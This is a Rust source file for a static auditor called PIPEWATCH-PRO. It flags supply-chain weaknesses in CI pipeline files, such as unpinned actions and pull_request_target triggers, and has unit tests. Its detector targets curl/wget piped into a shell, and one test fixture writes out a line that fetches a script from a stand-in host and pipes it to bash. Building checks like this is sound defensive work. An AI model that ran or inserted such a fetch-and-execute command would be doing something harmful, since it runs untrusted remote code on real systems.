// PIPEWATCH-PRO — Rust port of the CI/CD pipeline auditor.
//
// Mirrors the primary `audit` command of the Python tool: walks a target,
// finds GitHub Actions / GitLab CI pipeline files, and flags supply-chain
// weaknesses mapped to the OWASP CI/CD Top 10. No external crates (std only),
// no regex dependency. Passive and offline — reads files, never scans a network.
//
//   cargo run -- <path>                 # table output
//   cargo run -- --format json <path>
use std::{env, fs, path::Path};

const TOOL_NAME: &str = "PIPEWATCH-PRO";
const TOOL_VERSION: &str = "0.3.4";

#[derive(Clone)]
struct Finding {
    rule_id: &'static str,
    title: &'static str,
    severity: &'static str,
    file: String,
    line: usize,
}

fn sev_rank(s: &str) -> u8 {
    match s {
        "critical" => 0,
        "high" => 1,
        "medium" => 2,
        "low" => 3,
        _ => 4,
    }
}

fn strip_comment(line: &str) -> String {
    let (mut in_s, mut in_d) = (false, false);
    for (i, ch) in line.char_indices() {
        match ch {
            '\'' if !in_d => in_s = !in_s,
            '"' if !in_s => in_d = !in_d,
            '#' if !in_s && !in_d => return line[..i].to_string(),
            _ => {}
        }
    }
    line.to_string()
}

// Match `uses:` action ref; returns the ref string if present.
fn uses_ref(line: &str) -> Option<String> {
    let t = line.trim_start();
    let t = t.strip_prefix('-').map(|x| x.trim_start()).unwrap_or(t);
    let low = t.to_ascii_lowercase();
    if !low.starts_with("uses:") {
        return None;
    }
    let val = t[5..].trim().trim_matches(|c| c == '\'' || c == '"');
    let val = val.split_whitespace().next().unwrap_or("");
    let val = val.split('#').next().unwrap_or("").trim();
    if val.is_empty() {
        None
    } else {
        Some(val.to_string())
    }
}

fn run_body(line: &str) -> Option<String> {
    let t = line.trim_start();
    let t = t.strip_prefix('-').map(|x| x.trim_start()).unwrap_or(t);
    if t.to_ascii_lowercase().starts_with("run:") {
        Some(t[4..].trim().to_string())
    } else {
        None
    }
}

fn looks_like_action_ref(r: &str) -> bool {
    if r.starts_with("./") || r.starts_with("../") || r.starts_with("docker://") {
        return false;
    }
    r.contains('@') && r.split('@').next().unwrap_or("").contains('/')
}

// crude check: ref has a 40-char lowercase-hex SHA after '@'
fn is_sha_pinned(r: &str) -> bool {
    if let Some(tag) = r.split('@').nth(1) {
        tag.len() >= 40 && tag[..40].chars().all(|c| c.is_ascii_hexdigit() && !c.is_ascii_uppercase())
    } else {
        false
    }
}

fn curl_pipe_sh(s: &str) -> bool {
    let low = s.to_ascii_lowercase();
    if !(low.contains("curl") || low.contains("wget")) {
        return false;
    }
    if let Some(pipe) = low.find('|') {
        let rest = low[pipe + 1..].trim_start();
        let rest = rest.strip_prefix("sudo ").unwrap_or(rest).trim_start();
        return rest.starts_with("sh") || rest.starts_with("bash");
    }
    false
}

fn is_gitlab(path: &str) -> bool {
    let b = Path::new(path)
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    b == ".gitlab-ci.yml" || b == ".gitlab-ci.yaml"
}

fn is_pipeline_file(path: &str) -> bool {
    if is_gitlab(path) {
        return true;
    }
    let norm = path.replace('\\', "/").to_ascii_lowercase();
    norm.contains(".github/workflows/") && (norm.ends_with(".yml") || norm.ends_with(".yaml"))
}

fn audit_text(text: &str, path: &str) -> Vec<Finding> {
    let mut fs_out = Vec::new();
    let lines: Vec<&str> = text.lines().collect();
    let gitlab = is_gitlab(path);
    let has_perms = lines
        .iter()
        .any(|l| l.trim_start().to_ascii_lowercase().starts_with("permissions:"));
    let has_trigger = lines.iter().any(|l| {
        let s = strip_comment(l);
        let t = s.trim_start().trim_start_matches('\'');
        let low = t.to_ascii_lowercase();
        low.starts_with("on:") || low.starts_with("on :") || low.starts_with("on'") || low == "on"
    });
    let mut pr_target = false;

    for (i, raw) in lines.iter().enumerate() {
        let idx = i + 1;
        let line = strip_comment(raw);
        if line.trim().is_empty() {
            continue;
        }
        if let Some(r) = uses_ref(&line) {
            if looks_like_action_ref(&r) && !is_sha_pinned(&r) {
                let tag = r.split('@').nth(1).unwrap_or("");
                let sev = if tag == "main" || tag == "master" || tag == "latest" {
                    "critical"
                } else {
                    "high"
                };
                fs_out.push(Finding {
                    rule_id: "CICD-SEC-04",
                    title: "Action not pinned to a full commit SHA",
                    severity: sev,
                    file: path.into(),
                    line: idx,
                });
            }
        }
        let body = run_body(&line).unwrap_or_else(|| line.clone());
        if curl_pipe_sh(&body) {
            fs_out.push(Finding {
                rule_id: "CICD-SEC-07",
                title: "Remote script piped directly into a shell",
                severity: "high",
                file: path.into(),
                line: idx,
            });
        }
        if run_body(&line).is_some() && body.contains("${{") && body.contains("secrets.") {
            fs_out.push(Finding {
                rule_id: "CICD-SEC-06",
                title: "Secret interpolated directly into run script",
                severity: "medium",
                file: path.into(),
                line: idx,
            });
        }
        if line.contains("pull_request_target") {
            pr_target = true;
        }
    }

    if !gitlab && has_trigger && !has_perms {
        fs_out.push(Finding {
            rule_id: "CICD-SEC-05",
            title: "No explicit permissions: block",
            severity: "medium",
            file: path.into(),
            line: 0,
        });
    }
    if pr_target {
        fs_out.push(Finding {
            rule_id: "CICD-SEC-01",
            title: "pull_request_target exposes secrets to fork PRs",
            severity: "high",
            file: path.into(),
            line: 0,
        });
    }
    fs_out
}

fn walk(p: &Path, out: &mut Vec<String>) {
    if p.is_dir() {
        if let Ok(rd) = fs::read_dir(p) {
            for e in rd.flatten() {
                walk(&e.path(), out);
            }
        }
    } else if let Some(s) = p.to_str() {
        if is_pipeline_file(s) {
            out.push(s.to_string());
        }
    }
}

fn json_escape(s: &str) -> String {
    s.replace('\\', "\\\\").replace('"', "\\\"")
}

fn main() {
    let args: Vec<String> = env::args().skip(1).collect();
    let mut format = "table".to_string();
    let mut paths: Vec<String> = Vec::new();
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--format" if i + 1 < args.len() => {
                format = args[i + 1].clone();
                i += 1;
            }
            "--version" => {
                println!("{} {}", TOOL_NAME, TOOL_VERSION);
                return;
            }
            other => paths.push(other.to_string()),
        }
        i += 1;
    }
    if paths.is_empty() {
        paths.push(".".into());
    }

    let mut all: Vec<Finding> = Vec::new();
    for p in &paths {
        let pp = Path::new(p);
        if pp.is_file() {
            if let Ok(t) = fs::read_to_string(pp) {
                all.extend(audit_text(&t, p));
            }
            continue;
        }
        let mut files = Vec::new();
        walk(pp, &mut files);
        files.sort();
        for f in files {
            if let Ok(t) = fs::read_to_string(&f) {
                all.extend(audit_text(&t, &f));
            }
        }
    }
    all.sort_by(|a, b| {
        sev_rank(a.severity)
            .cmp(&sev_rank(b.severity))
            .then(a.file.cmp(&b.file))
    });
    let failed = all
        .iter()
        .filter(|f| f.severity == "critical" || f.severity == "high")
        .count();

    if format == "json" {
        let items: Vec<String> = all
            .iter()
            .map(|f| {
                format!(
                    "{{\"rule_id\":\"{}\",\"title\":\"{}\",\"severity\":\"{}\",\"file\":\"{}\",\"line\":{}}}",
                    f.rule_id,
                    json_escape(f.title),
                    f.severity,
                    json_escape(&f.file),
                    f.line
                )
            })
            .collect();
        println!(
            "{{\"tool\":\"{}\",\"version\":\"{}\",\"summary\":{{\"total\":{},\"failed\":{}}},\"findings\":[{}]}}",
            TOOL_NAME,
            TOOL_VERSION,
            all.len(),
            failed,
            items.join(",")
        );
    } else {
        println!("{} {} - CI/CD supply-chain audit", TOOL_NAME, TOOL_VERSION);
        for f in &all {
            println!(
                "[{:8}] {}  {}\n        at {}:{}",
                f.severity, f.rule_id, f.title, f.file, f.line
            );
        }
        println!("Total: {}  Gating (critical+high): {}", all.len(), failed);
    }
    if failed > 0 {
        std::process::exit(1);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const RISKY: &str = "name: ci\non:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n      - run: curl https://x.test/i.sh | bash\n";
    const CLEAN: &str = "name: ci\non:\n  push:\npermissions:\n  contents: read\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@8f152de45cc393bb48ce5d89d36b731f54556e65\n      - run: make build\n";

    fn rules(text: &str) -> Vec<&'static str> {
        audit_text(text, ".github/workflows/ci.yml")
            .iter()
            .map(|f| f.rule_id)
            .collect()
    }

    #[test]
    fn risky_flags_categories() {
        let r = rules(RISKY);
        for want in ["CICD-SEC-01", "CICD-SEC-04", "CICD-SEC-05", "CICD-SEC-07"] {
            assert!(r.contains(&want), "missing {}", want);
        }
    }

    #[test]
    fn clean_no_high_or_critical() {
        for f in audit_text(CLEAN, ".github/workflows/ci.yml") {
            assert!(f.severity != "high" && f.severity != "critical");
        }
    }

    #[test]
    fn sha_pin_not_flagged() {
        assert!(!rules(CLEAN).contains(&"CICD-SEC-04"));
    }

    #[test]
    fn identity() {
        assert_eq!(TOOL_NAME, "PIPEWATCH-PRO");
        assert!(!TOOL_VERSION.is_empty());
    }
}
